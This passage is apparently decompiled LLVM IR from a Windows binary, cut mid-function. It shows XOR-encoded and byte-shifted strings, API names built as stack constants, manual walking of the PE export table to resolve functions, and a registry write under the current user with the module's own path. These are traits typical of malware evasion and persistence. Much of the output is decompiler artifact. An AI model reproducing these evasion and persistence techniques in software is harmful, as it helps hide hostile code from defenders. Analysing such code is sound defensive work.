  %128 = inttoptr i32 %127 to i32*, !insn.addr !4514
  %129 = ptrtoint %_OSVERSIONINFOW** %stack_var_-67216 to i32, !insn.addr !4514
  store i32 %129, i32* %128, align 4, !insn.addr !4514
  %130 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4515
  store %_OSVERSIONINFOW* inttoptr (i32 284 to %_OSVERSIONINFOW*), %_OSVERSIONINFOW** %stack_var_-67216, align 4, !insn.addr !4516
  store i32 %129, i32* %116, align 4, !insn.addr !4517
  %131 = load %_OSVERSIONINFOW*, %_OSVERSIONINFOW** %stack_var_-67216, align 4, !insn.addr !4518
  %132 = call i1 @GetVersionExW(%_OSVERSIONINFOW* %131), !insn.addr !4518
  %133 = load i128, i128* @global_var_10039ba0, align 4, !insn.addr !4519
  %134 = call i128 @__asm_movaps(i128 %133), !insn.addr !4519
  %135 = load i32, i32* %stack_var_-144, align 4, !insn.addr !4520
  %136 = sext i32 %135 to i128, !insn.addr !4520
  call void @__asm_movups(i128 %136, i128 %134), !insn.addr !4520
  %137 = call i32 @function_10009390(), !insn.addr !4521
  store i32 1000, i32* %118, align 4, !insn.addr !4522
  %138 = ptrtoint i32* %stack_var_-3132 to i32, !insn.addr !4523
  store i32 %138, i32* %124, align 4, !insn.addr !4523
  store i32 7340097, i32* @global_var_100409b8, align 4, !insn.addr !4524
  %139 = ptrtoint i32* %stack_var_-67256 to i32, !insn.addr !4525
  store i32 %139, i32* %126, align 4, !insn.addr !4525
  store i32 0, i32* %128, align 4, !insn.addr !4526
  %140 = add i32 %esp.4.reload, -48, !insn.addr !4527
  %141 = inttoptr i32 %140 to i32*, !insn.addr !4527
  store i32 0, i32* %141, align 4, !insn.addr !4527
  %142 = add i32 %esp.4.reload, -52, !insn.addr !4528
  %143 = inttoptr i32 %142 to i32*, !insn.addr !4528
  store i32 268452304, i32* %143, align 4, !insn.addr !4528
  %144 = add i32 %esp.4.reload, -56, !insn.addr !4529
  %145 = inttoptr i32 %144 to i32*, !insn.addr !4529
  store i32 0, i32* %145, align 4, !insn.addr !4529
  %146 = add i32 %esp.4.reload, -60, !insn.addr !4530
  %147 = inttoptr i32 %146 to i32*, !insn.addr !4530
  store i32 0, i32* %147, align 4, !insn.addr !4530
  store i32 4456560, i32* @global_var_100409bc, align 4, !insn.addr !4531
  store i32 7602273, i32* @global_var_100409c0, align 4, !insn.addr !4532
  store i32 97, i32* @global_var_100409c4, align 4, !insn.addr !4533
  store i16* inttoptr (i32 6881357 to i16*), i16** @global_var_10040958, align 4, !insn.addr !4534
  store i32 7471203, i32* @global_var_1004095c, align 4, !insn.addr !4535
  store i32 7536751, i32* @global_var_10040960, align 4, !insn.addr !4536
  store i32 6684783, i32* @global_var_10040964, align 4, !insn.addr !4537
  store i32 116, i32* @global_var_10040968, align 4, !insn.addr !4538
  %148 = add i32 %esp.4.reload, -64, !insn.addr !4539
  %149 = inttoptr i32 %148 to i32*, !insn.addr !4539
  store i32 ptrtoint ([13 x i8]* @global_var_1003d9b8 to i32), i32* %149, align 4, !insn.addr !4539
  store i32 2003593331, i32* %stack_var_-144, align 4, !insn.addr !4540
  %150 = add i32 %esp.4.reload, -68, !insn.addr !4541
  %151 = inttoptr i32 %150 to i32*, !insn.addr !4541
  %152 = ptrtoint i32* %stack_var_-144 to i32, !insn.addr !4541
  store i32 %152, i32* %151, align 4, !insn.addr !4541
  %153 = add i32 %esp.4.reload, -72, !insn.addr !4542
  %154 = inttoptr i32 %153 to i32*, !insn.addr !4542
  store i32 300, i32* %154, align 4, !insn.addr !4542
  %155 = add i32 %esp.4.reload, -76, !insn.addr !4543
  %156 = inttoptr i32 %155 to i32*, !insn.addr !4543
  %157 = ptrtoint i32* %stack_var_-46132 to i32, !insn.addr !4543
  store i32 %157, i32* %156, align 4, !insn.addr !4543
  %158 = add i32 %esp.4.reload, -80, !insn.addr !4544
  %159 = inttoptr i32 %158 to i32*, !insn.addr !4544
  store i32 0, i32* %159, align 4, !insn.addr !4544
  %160 = load i32, i32* %stack_var_-144, align 4, !insn.addr !4545
  %161 = inttoptr i32 %160 to i32*, !insn.addr !4545
  %162 = call i32 @GetModuleFileNameA(i32* %161, i8* inttoptr (i32 778661985 to i8*), i32 7105636), !insn.addr !4545
  %163 = add i32 %93, -40, !insn.addr !4546
  %164 = add i32 %93, -3128, !insn.addr !4547
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !4548
  br label %dec_label_pc_10008140, !insn.addr !4548

dec_label_pc_10008140:                            ; preds = %dec_label_pc_10008140, %dec_label_pc_10007fc1
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %165 = add i32 %163, %ecx.3.reload, !insn.addr !4546
  %166 = inttoptr i32 %165 to i8*, !insn.addr !4546
  %167 = load i8, i8* %166, align 1, !insn.addr !4546
  %168 = xor i8 %167, 35, !insn.addr !4549
  %169 = zext i8 %168 to i16, !insn.addr !4547
  %170 = mul i32 %ecx.3.reload, 2, !insn.addr !4547
  %171 = add i32 %170, %164, !insn.addr !4547
  %172 = inttoptr i32 %171 to i16*, !insn.addr !4547
  store i16 %169, i16* %172, align 2, !insn.addr !4547
  %173 = add nuw nsw i32 %ecx.3.reload, 1, !insn.addr !4550
  %exitcond118 = icmp eq i32 %173, 32
  store i32 %173, i32* %ecx.3.reg2mem, !insn.addr !4551
  store i32 32, i32* %ecx.4.reg2mem, !insn.addr !4551
  store i32 0, i32* %edx.0.reg2mem, !insn.addr !4551
  br i1 %exitcond118, label %dec_label_pc_10008160, label %dec_label_pc_10008140, !insn.addr !4551

dec_label_pc_10008160:                            ; preds = %dec_label_pc_10008140, %dec_label_pc_10008160
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %174 = add i32 %edx.0.reload, ptrtoint (i8** @global_var_100398bc to i32), !insn.addr !4552
  %175 = inttoptr i32 %174 to i8*, !insn.addr !4552
  %176 = load i8, i8* %175, align 1, !insn.addr !4552
  %177 = add nuw nsw i32 %edx.0.reload, 1, !insn.addr !4553
  %178 = xor i8 %176, 35, !insn.addr !4554
  %179 = sext i8 %178 to i16, !insn.addr !4555
  %180 = mul i32 %ecx.4.reload, 2, !insn.addr !4555
  %181 = add i32 %180, %164, !insn.addr !4555
  %182 = inttoptr i32 %181 to i16*, !insn.addr !4555
  store i16 %179, i16* %182, align 2, !insn.addr !4555
  %183 = add nuw nsw i32 %ecx.4.reload, 1, !insn.addr !4556
  %exitcond117 = icmp eq i32 %177, 13
  store i32 %183, i32* %ecx.4.reg2mem, !insn.addr !4557
  store i32 %177, i32* %edx.0.reg2mem, !insn.addr !4557
  br i1 %exitcond117, label %dec_label_pc_10008193, label %dec_label_pc_10008160, !insn.addr !4557

dec_label_pc_10008193:                            ; preds = %dec_label_pc_10008160
  store i16* inttoptr (i32 45 to i16*), i16** %stack_var_-67220, align 4, !insn.addr !4558
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-67228, align 4, !insn.addr !4559
  %184 = add i32 %93, -3038, !insn.addr !4560
  %185 = inttoptr i32 %184 to i16*, !insn.addr !4560
  store i16 0, i16* %185, align 2, !insn.addr !4560
  %186 = add i32 %esp.4.reload, -84, !insn.addr !4561
  %187 = inttoptr i32 %186 to i32*, !insn.addr !4561
  store i32 ptrtoint ([14 x i8]* @global_var_100393fc to i32), i32* %187, align 4, !insn.addr !4561
  %188 = add i32 %esp.4.reload, -88, !insn.addr !4562
  %189 = inttoptr i32 %188 to i32*, !insn.addr !4562
  store i32 %152, i32* %189, align 4, !insn.addr !4562
  %190 = load i8*, i8** %stack_var_-67228, align 4, !insn.addr !4563
  %191 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4563
  %192 = bitcast i16* %191 to i8*
  %193 = call i8* @lstrcpyA(i8* %190, i8* %192), !insn.addr !4563
  %194 = add i32 %93, -140, !insn.addr !4564
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !4565
  br label %dec_label_pc_100081b1, !insn.addr !4565

dec_label_pc_100081b1:                            ; preds = %dec_label_pc_100081b1, %dec_label_pc_10008193
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %195 = add i32 %eax.1.reload, %194, !insn.addr !4564
  %196 = inttoptr i32 %195 to i8*, !insn.addr !4564
  %197 = load i8, i8* %196, align 1, !insn.addr !4564
  %198 = add i8 %197, -1, !insn.addr !4564
  store i8 %198, i8* %196, align 1, !insn.addr !4564
  %199 = add nuw nsw i32 %eax.1.reload, 1, !insn.addr !4566
  %exitcond116 = icmp eq i32 %199, 13
  store i32 %199, i32* %eax.1.reg2mem, !insn.addr !4567
  br i1 %exitcond116, label %dec_label_pc_100081be, label %dec_label_pc_100081b1, !insn.addr !4567

dec_label_pc_100081be:                            ; preds = %dec_label_pc_100081b1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-67228, align 4, !insn.addr !4568
  %200 = add i32 %esp.4.reload, -92, !insn.addr !4569
  %201 = inttoptr i32 %200 to i32*, !insn.addr !4569
  store i32 %152, i32* %201, align 4, !insn.addr !4569
  %202 = add i32 %esp.4.reload, -96, !insn.addr !4570
  %203 = inttoptr i32 %202 to i32*, !insn.addr !4570
  store i32 %139, i32* %203, align 4, !insn.addr !4570
  %204 = load i8*, i8** %stack_var_-67228, align 4, !insn.addr !4571
  %205 = ptrtoint i8* %204 to i32, !insn.addr !4571
  %206 = call i32 @function_10009e60(i32 %205, i32* nonnull @1), !insn.addr !4571
  %207 = ptrtoint i32* %stack_var_-67240 to i32, !insn.addr !4572
  store i32 %207, i32* %201, align 4, !insn.addr !4572
  store i32 131079, i32* %203, align 4, !insn.addr !4573
  %208 = add i32 %esp.4.reload, -100, !insn.addr !4574
  %209 = inttoptr i32 %208 to i32*, !insn.addr !4574
  store i32 0, i32* %209, align 4, !insn.addr !4574
  %210 = add i32 %esp.4.reload, -104, !insn.addr !4575
  %211 = inttoptr i32 %210 to i32*, !insn.addr !4575
  store i32 %138, i32* %211, align 4, !insn.addr !4575
  %212 = add i32 %esp.4.reload, -108, !insn.addr !4576
  %213 = inttoptr i32 %212 to i32*, !insn.addr !4576
  store i32 -2147483647, i32* %213, align 4, !insn.addr !4576
  %214 = add i32 %esp.4.reload, -112, !insn.addr !4577
  %215 = inttoptr i32 %214 to i32*, !insn.addr !4577
  store i32 ptrtoint ([15 x i8]* @global_var_1003940c to i32), i32* %215, align 4, !insn.addr !4577
  %216 = add i32 %esp.4.reload, -116, !insn.addr !4578
  %217 = inttoptr i32 %216 to i32*, !insn.addr !4578
  store i32 %152, i32* %217, align 4, !insn.addr !4578
  %218 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4579
  store i32 0, i32* %eax.2.reg2mem, !insn.addr !4580
  br label %dec_label_pc_10008230, !insn.addr !4580

dec_label_pc_10008230:                            ; preds = %dec_label_pc_10008230, %dec_label_pc_100081be
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %219 = add i32 %eax.2.reload, %194, !insn.addr !4581
  %220 = inttoptr i32 %219 to i8*, !insn.addr !4581
  %221 = load i8, i8* %220, align 1, !insn.addr !4581
  %222 = add i8 %221, -1, !insn.addr !4581
  store i8 %222, i8* %220, align 1, !insn.addr !4581
  %223 = add nuw nsw i32 %eax.2.reload, 1, !insn.addr !4582
  %exitcond = icmp eq i32 %223, 14
  store i32 %223, i32* %eax.2.reg2mem, !insn.addr !4583
  br i1 %exitcond, label %dec_label_pc_1000823d, label %dec_label_pc_10008230, !insn.addr !4583

dec_label_pc_1000823d:                            ; preds = %dec_label_pc_10008230
  store i8* inttoptr (i32 14 to i8*), i8** %stack_var_-67228, align 4, !insn.addr !4584
  %224 = add i32 %2, 120, !insn.addr !4585
  %225 = add i32 %224, %139, !insn.addr !4585
  %226 = inttoptr i32 %225 to i32*, !insn.addr !4585
  %227 = load i32, i32* %226, align 4, !insn.addr !4585
  %228 = add i32 %227, %139, !insn.addr !4586
  %229 = add i32 %esp.4.reload, -120, !insn.addr !4587
  %230 = inttoptr i32 %229 to i32*, !insn.addr !4587
  store i32 %152, i32* %230, align 4, !insn.addr !4587
  %231 = add i32 %esp.4.reload, -124, !insn.addr !4588
  %232 = inttoptr i32 %231 to i32*, !insn.addr !4588
  store i32 %139, i32* %232, align 4, !insn.addr !4588
  %233 = load i8*, i8** %stack_var_-67228, align 4, !insn.addr !4589
  %234 = ptrtoint i8* %233 to i32, !insn.addr !4589
  %235 = call i32 @function_10009e60(i32 %234, i32* nonnull @1), !insn.addr !4589
  %236 = add i32 %228, 36, !insn.addr !4590
  %237 = inttoptr i32 %236 to i32*, !insn.addr !4590
  %238 = load i32, i32* %237, align 4, !insn.addr !4590
  %239 = load i128, i128* @global_var_10039a80, align 4, !insn.addr !4591
  %240 = call i128 @__asm_movaps(i128 %239), !insn.addr !4591
  %241 = mul i32 %235, 2, !insn.addr !4592
  %242 = add i32 %241, %139, !insn.addr !4592
  %243 = add i32 %242, %238, !insn.addr !4593
  %244 = inttoptr i32 %243 to i16*, !insn.addr !4593
  %245 = load i16, i16* %244, align 2, !insn.addr !4593
  %246 = zext i16 %245 to i32, !insn.addr !4593
  %247 = add i32 %228, 28, !insn.addr !4594
  %248 = inttoptr i32 %247 to i32*, !insn.addr !4594
  %249 = load i32, i32* %248, align 4, !insn.addr !4594
  %250 = mul i32 %246, 4, !insn.addr !4595
  %251 = add i32 %249, %139, !insn.addr !4595
  %252 = add i32 %251, %250, !insn.addr !4596
  %253 = inttoptr i32 %252 to i32*, !insn.addr !4596
  %254 = load i32, i32* %253, align 4, !insn.addr !4596
  %255 = add i32 %254, %139, !insn.addr !4597
  %256 = load i32, i32* %stack_var_-144, align 4, !insn.addr !4598
  %257 = sext i32 %256 to i128, !insn.addr !4598
  call void @__asm_movups(i128 %257, i128 %240), !insn.addr !4598
  %258 = load i32, i32* %226, align 4, !insn.addr !4599
  %259 = add i32 %258, %139, !insn.addr !4600
  %260 = add i32 %esp.4.reload, -128, !insn.addr !4601
  %261 = inttoptr i32 %260 to i32*, !insn.addr !4601
  store i32 %152, i32* %261, align 4, !insn.addr !4601
  %262 = add i32 %esp.4.reload, -132, !insn.addr !4602
  %263 = inttoptr i32 %262 to i32*, !insn.addr !4602
  store i32 %139, i32* %263, align 4, !insn.addr !4602
  %264 = call i32 @function_10009e60(i32 %255, i32* nonnull @1), !insn.addr !4603
  %265 = add i32 %259, 36, !insn.addr !4604
  %266 = inttoptr i32 %265 to i32*, !insn.addr !4604
  %267 = load i32, i32* %266, align 4, !insn.addr !4604
  %268 = mul i32 %264, 2, !insn.addr !4605
  %269 = add i32 %268, %139, !insn.addr !4605
  %270 = add i32 %269, %267, !insn.addr !4606
  %271 = inttoptr i32 %270 to i16*, !insn.addr !4606
  %272 = load i16, i16* %271, align 2, !insn.addr !4606
  %273 = zext i16 %272 to i32, !insn.addr !4606
  %274 = add i32 %259, 28, !insn.addr !4607
  %275 = inttoptr i32 %274 to i32*, !insn.addr !4607
  %276 = load i32, i32* %275, align 4, !insn.addr !4607
  %277 = mul i32 %273, 4, !insn.addr !4608
  %278 = add i32 %276, %139, !insn.addr !4608
  %279 = add i32 %278, %277, !insn.addr !4609
  %280 = inttoptr i32 %279 to i32*, !insn.addr !4609
  %281 = load i32, i32* %280, align 4, !insn.addr !4609
  %282 = ptrtoint i8** %stack_var_-67228 to i32, !insn.addr !4610
  store i32 %282, i32* %230, align 4, !insn.addr !4610
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-67228, align 4, !insn.addr !4611
  store i32 %138, i32* %232, align 4, !insn.addr !4612
  store i16* inttoptr (i32 1 to i16*), i16** %stack_var_-67220, align 4, !insn.addr !4613
  %283 = ptrtoint i16** %stack_var_-67220 to i32, !insn.addr !4614
  store i32 %283, i32* %261, align 4, !insn.addr !4614
  store i32 0, i32* %263, align 4, !insn.addr !4615
  %284 = add i32 %esp.4.reload, -136, !insn.addr !4616
  %285 = inttoptr i32 %284 to i32*, !insn.addr !4616
  store i32 ptrtoint ([5 x i8]* @global_var_1003941c to i32), i32* %285, align 4, !insn.addr !4616
  %286 = load i32, i32* %stack_var_-67240, align 4, !insn.addr !4617
  %287 = add i32 %esp.4.reload, -140, !insn.addr !4617
  %288 = inttoptr i32 %287 to i32*, !insn.addr !4617
  store i32 %286, i32* %288, align 4, !insn.addr !4617
  %289 = add i32 %281, %139, !insn.addr !4618
  %290 = icmp eq i32 %289, 2, !insn.addr !4619
  %291 = icmp eq i1 %290, false, !insn.addr !4620
  store i32 %287, i32* %esp.5.reg2mem, !insn.addr !4620
  br i1 %291, label %dec_label_pc_10008341, label %dec_label_pc_10008301, !insn.addr !4620

dec_label_pc_10008301:                            ; preds = %dec_label_pc_1000823d
  %292 = add i32 %esp.4.reload, -144, !insn.addr !4621
  %293 = inttoptr i32 %292 to i32*, !insn.addr !4621
  store i32 1000, i32* %293, align 4, !insn.addr !4621
  %294 = add i32 %esp.4.reload, -148, !insn.addr !4622
  %295 = inttoptr i32 %294 to i32*, !insn.addr !4622
  %296 = ptrtoint i32* %stack_var_-6132 to i32, !insn.addr !4622
  store i32 %296, i32* %295, align 4, !insn.addr !4622
  %297 = add i32 %esp.4.reload, -152, !insn.addr !4623
  %298 = inttoptr i32 %297 to i32*, !insn.addr !4623
  store i32 0, i32* %298, align 4, !insn.addr !4623
  %299 = load i8*, i8** %stack_var_-67228, align 4, !insn.addr !4624
  %300 = bitcast i8* %299 to i32*
  %301 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4624
  %302 = call i32 @GetModuleFileNameW(i32* %300, i16* %301, i32 ptrtoint (i32* @1 to i32)), !insn.addr !4624
  %303 = add i32 %esp.4.reload, -156, !insn.addr !4625
  %304 = inttoptr i32 %303 to i32*, !insn.addr !4625
  store i32 %296, i32* %304, align 4, !insn.addr !4625
  %305 = call i32 @lstrlenW(i16* bitcast (i32* @1 to i16*)), !insn.addr !4626
  %306 = mul i32 %305, 2, !insn.addr !4627
  %307 = add i32 %esp.4.reload, -160, !insn.addr !4628
  %308 = inttoptr i32 %307 to i32*, !insn.addr !4628
  store i32 %306, i32* %308, align 4, !insn.addr !4628
  %309 = add i32 %esp.4.reload, -164, !insn.addr !4629
  %310 = inttoptr i32 %309 to i32*, !insn.addr !4629
  store i32 %296, i32* %310, align 4, !insn.addr !4629
  %311 = add i32 %esp.4.reload, -168, !insn.addr !4630
  %312 = inttoptr i32 %311 to i32*, !insn.addr !4630
  store i32 1, i32* %312, align 4, !insn.addr !4630
  %313 = add i32 %esp.4.reload, -172, !insn.addr !4631
  %314 = inttoptr i32 %313 to i32*, !insn.addr !4631
  store i32 0, i32* %314, align 4, !insn.addr !4631
  %315 = add i32 %esp.4.reload, -176, !insn.addr !4632
  %316 = inttoptr i32 %315 to i32*, !insn.addr !4632
  store i32 ptrtoint ([5 x i16]* @global_var_10039424 to i32), i32* %316, align 4, !insn.addr !4632
  %317 = load i32, i32* %stack_var_-67240, align 4, !insn.addr !4633
  %318 = add i32 %esp.4.reload, -180, !insn.addr !4633
  %319 = inttoptr i32 %318 to i32*, !insn.addr !4633
  store i32 %317, i32* %319, align 4, !insn.addr !4633
  store i32 %318, i32* %esp.5.reg2mem, !insn.addr !4634
  br label %dec_label_pc_10008341, !insn.addr !4634

dec_label_pc_10008341:                            ; preds = %dec_label_pc_10008301, %dec_label_pc_1000823d
  %esp.5.reload = load i32, i32* %esp.5.reg2mem
  %320 = add i32 %esp.5.reload, -4
  %321 = inttoptr i32 %320 to i32*
  %322 = ptrtoint i32* %stack_var_-67236 to i32, !insn.addr !4635
  store i32 %322, i32* %321, align 4, !insn.addr !4635
  %323 = add i32 %esp.5.reload, -8
  %324 = inttoptr i32 %323 to i32*
  %325 = ptrtoint i128* %stack_var_-488 to i32, !insn.addr !4636
  store i32 %325, i32* %324, align 4, !insn.addr !4636
  %326 = call i32 @function_10008e70(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4637
  %327 = icmp eq i32 %326, 0, !insn.addr !4638
  %328 = icmp eq i1 %327, false, !insn.addr !4639
  store i32 %esp.5.reload, i32* %esp.6.reg2mem, !insn.addr !4639
  store i32* %324, i32** %.pre-phi125.reg2mem, !insn.addr !4639
  store i32* %321, i32** %.pre-phi121.reg2mem, !insn.addr !4639
  store i32 %esp.5.reload, i32* %esp.7.reg2mem, !insn.addr !4639
  br i1 %328, label %dec_label_pc_10008394, label %dec_label_pc_10008367, !insn.addr !4639

dec_label_pc_10008367:                            ; preds = %dec_label_pc_10008341, %dec_label_pc_10008367
  %esp.6.reload = load i32, i32* %esp.6.reg2mem
  %329 = add i32 %esp.6.reload, -4, !insn.addr !4640
  %330 = inttoptr i32 %329 to i32*, !insn.addr !4640
  store i32 60000, i32* %330, align 4, !insn.addr !4640
  call void @Sleep(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4641
  %331 = add i32 %esp.6.reload, -8, !insn.addr !4642
  %332 = inttoptr i32 %331 to i32*
  store i32 %322, i32* %332, align 4, !insn.addr !4642
  %333 = add i32 %esp.6.reload, -12, !insn.addr !4643
  %334 = inttoptr i32 %333 to i32*
  store i32 %325, i32* %334, align 4, !insn.addr !4643
  %335 = call i32 @function_10008e70(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4644
  %336 = icmp eq i32 %335, 0, !insn.addr !4645
  store i32 %329, i32* %esp.6.reg2mem, !insn.addr !4646
  store i32* %334, i32** %.pre-phi125.reg2mem, !insn.addr !4646
  store i32* %332, i32** %.pre-phi121.reg2mem, !insn.addr !4646
  store i32 %329, i32* %esp.7.reg2mem, !insn.addr !4646
  br i1 %336, label %dec_label_pc_10008367, label %dec_label_pc_10008394, !insn.addr !4646

dec_label_pc_10008394:                            ; preds = %dec_label_pc_10008367, %dec_label_pc_10008341
  %esp.7.reload = load i32, i32* %esp.7.reg2mem
  %.pre-phi121.reload = load i32*, i32** %.pre-phi121.reg2mem
  %.pre-phi125.reload = load i32*, i32** %.pre-phi125.reg2mem
  %337 = load i128, i128* @global_var_10039a20, align 4, !insn.addr !4647
  %338 = call i128 @__asm_movaps(i128 %337), !insn.addr !4647
  call void @__asm_movups(i128 undef, i128 %338), !insn.addr !4648
  %339 = load i128, i128* @global_var_10039bd0, align 4, !insn.addr !4649
  %340 = call i128 @__asm_movaps(i128 %339), !insn.addr !4649
  call void @__asm_movups(i128 %1, i128 %340), !insn.addr !4650
  %341 = call i32 @function_100079b0(i16 112), !insn.addr !4651
  store i32 %157, i32* %.pre-phi121.reload, align 4, !insn.addr !4652
  store i32 ptrtoint ([5 x i8]* @global_var_10039430 to i32), i32* %.pre-phi125.reload, align 4, !insn.addr !4653
  %342 = add i32 %esp.7.reload, -12, !insn.addr !4654
  %343 = inttoptr i32 %342 to i32*, !insn.addr !4654
  store i32 %157, i32* %343, align 4, !insn.addr !4654
  %344 = call i32 @function_100074a0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4655
  %345 = call i32 @function_10008c90(), !insn.addr !4656
  %346 = ptrtoint i32* %stack_var_-608 to i32, !insn.addr !4657
  store i32 %346, i32* %edx.1.reg2mem, !insn.addr !4658
  br label %dec_label_pc_100083f3, !insn.addr !4658

dec_label_pc_100083f3:                            ; preds = %dec_label_pc_100083f3, %dec_label_pc_10008394
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %347 = inttoptr i32 %edx.1.reload to i8*, !insn.addr !4659
  %348 = load i8, i8* %347, align 1, !insn.addr !4659
  %349 = add i32 %edx.1.reload, 1, !insn.addr !4660
  %350 = icmp eq i8 %348, 0, !insn.addr !4661
  %351 = icmp eq i1 %350, false, !insn.addr !4662
  store i32 %349, i32* %edx.1.reg2mem, !insn.addr !4662
  br i1 %351, label %dec_label_pc_100083f3, label %dec_label_pc_100083fa, !insn.addr !4662

dec_label_pc_100083fa:                            ; preds = %dec_label_pc_100083f3
  %352 = ptrtoint i32* %stack_var_-2109 to i32, !insn.addr !4663
  store i32 %352, i32* %edi.0.reg2mem, !insn.addr !4663
  br label %dec_label_pc_10008403, !insn.addr !4663

dec_label_pc_10008403:                            ; preds = %dec_label_pc_10008403, %dec_label_pc_100083fa
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %353 = add i32 %edi.0.reload, 1, !insn.addr !4664
  %354 = inttoptr i32 %353 to i8*
  %355 = load i8, i8* %354, align 1, !insn.addr !4664
  %356 = icmp eq i8 %355, 0, !insn.addr !4665
  %357 = icmp eq i1 %356, false, !insn.addr !4666
  store i32 %353, i32* %edi.0.reg2mem, !insn.addr !4666
  br i1 %357, label %dec_label_pc_10008403, label %dec_label_pc_1000840b, !insn.addr !4666

dec_label_pc_1000840b:                            ; preds = %dec_label_pc_10008403
  %358 = sub i32 %349, %346, !insn.addr !4667
  %359 = udiv i32 %358, 4, !insn.addr !4668
  %360 = bitcast i32* %stack_var_-608 to i8*, !insn.addr !4669
  call void @__asm_rep_movsd_memcpy(i8* %354, i8* nonnull %360, i32 %359), !insn.addr !4669
  %361 = select i1 %0, i32 -4, i32 4, !insn.addr !4669
  %362 = mul i32 %359, %361, !insn.addr !4669
  %363 = add i32 %353, %362, !insn.addr !4669
  %364 = and i32 %358, 3, !insn.addr !4670
  %365 = inttoptr i32 %363 to i8*, !insn.addr !4671
  call void @__asm_rep_movsb_memcpy(i8* %365, i8* %365, i32 %364), !insn.addr !4671
  store i32 %352, i32* %edi.1.reg2mem, !insn.addr !4672
  br label %dec_label_pc_10008420, !insn.addr !4672

dec_label_pc_10008420:                            ; preds = %dec_label_pc_10008420, %dec_label_pc_1000840b
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %366 = add i32 %edi.1.reload, 1, !insn.addr !4673
  %367 = inttoptr i32 %366 to i8*, !insn.addr !4673
  %368 = load i8, i8* %367, align 1, !insn.addr !4673
  %369 = icmp eq i8 %368, 0, !insn.addr !4674
  %370 = icmp eq i1 %369, false, !insn.addr !4675
  store i32 %366, i32* %edi.1.reg2mem, !insn.addr !4675
  br i1 %370, label %dec_label_pc_10008420, label %dec_label_pc_1000842a, !insn.addr !4675

dec_label_pc_1000842a:                            ; preds = %dec_label_pc_10008420
  %371 = add i32 %esp.7.reload, -16, !insn.addr !4676
  %372 = inttoptr i32 %371 to i32*, !insn.addr !4676
  store i32 100, i32* %372, align 4, !insn.addr !4676
  %373 = inttoptr i32 %366 to i32*, !insn.addr !4677
  store i32 4027686, i32* %373, align 4, !insn.addr !4677
  %374 = add i32 %esp.7.reload, -20, !insn.addr !4678
  %375 = inttoptr i32 %374 to i32*, !insn.addr !4678
  store i32 0, i32* %375, align 4, !insn.addr !4678
  %376 = add i32 %esp.7.reload, -24, !insn.addr !4679
  %377 = inttoptr i32 %376 to i32*, !insn.addr !4679
  %378 = ptrtoint i32* %stack_var_-588 to i32, !insn.addr !4679
  store i32 %378, i32* %377, align 4, !insn.addr !4679
  store i16* inttoptr (i32 100 to i16*), i16** %stack_var_-67224, align 4, !insn.addr !4680
  %379 = call i32* @_memset(i32* inttoptr (i32 100 to i32*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4681
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-272, align 4, !insn.addr !4682
  %380 = ptrtoint i8** %stack_var_-272 to i32, !insn.addr !4683
  store i32 %380, i32* %372, align 4, !insn.addr !4683
  %381 = load i8*, i8** %stack_var_-272, align 4, !insn.addr !4684
  %382 = call i32* @GetModuleHandleA(i8* %381), !insn.addr !4684
  %383 = ptrtoint i32* %382 to i32, !insn.addr !4684
  store i32 1684107084, i32* %stack_var_-144, align 4, !insn.addr !4685
  %384 = add i32 %383, 60, !insn.addr !4686
  %385 = inttoptr i32 %384 to i32*, !insn.addr !4686
  %386 = load i32, i32* %385, align 4, !insn.addr !4686
  %387 = add i32 %383, 120, !insn.addr !4687
  %388 = add i32 %387, %386, !insn.addr !4687
  %389 = inttoptr i32 %388 to i32*, !insn.addr !4687
  %390 = load i32, i32* %389, align 4, !insn.addr !4687
  %391 = add i32 %390, %383, !insn.addr !4688
  store i32 %152, i32* %375, align 4, !insn.addr !4689
  store i32 %383, i32* %377, align 4, !insn.addr !4690
  %392 = load i32, i32* %stack_var_-144, align 4, !insn.addr !4691
  %393 = call i32 @function_10009e60(i32 %392, i32* inttoptr (i32 1919052108 to i32*)), !insn.addr !4691
  %394 = add i32 %391, 36, !insn.addr !4692
  %395 = inttoptr i32 %394 to i32*, !insn.addr !4692
  %396 = load i32, i32* %395, align 4, !insn.addr !4692
  %397 = mul i32 %393, 2, !insn.addr !4693
  %398 = add i32 %397, %383, !insn.addr !4693
  %399 = add i32 %398, %396, !insn.addr !4694
  %400 = inttoptr i32 %399 to i16*, !insn.addr !4694
  %401 = load i16, i16* %400, align 2, !insn.addr !4694
  %402 = zext i16 %401 to i32, !insn.addr !4694
  %403 = add i32 %391, 28, !insn.addr !4695
  %404 = inttoptr i32 %403 to i32*, !insn.addr !4695
  %405 = load i32, i32* %404, align 4, !insn.addr !4695
  %406 = mul i32 %402, 4, !insn.addr !4696
  %407 = add i32 %405, %383, !insn.addr !4696
  %408 = add i32 %407, %406, !insn.addr !4697
  %409 = inttoptr i32 %408 to i32*, !insn.addr !4697
  %410 = load i32, i32* %409, align 4, !insn.addr !4697
  %411 = add i32 %410, %383, !insn.addr !4698
  store i32 1635148865, i32* %stack_var_-588, align 4, !insn.addr !4699
  store i32 %378, i32* %375, align 4, !insn.addr !4700
  store i32 %411, i32* @global_var_1004094c, align 4, !insn.addr !4701
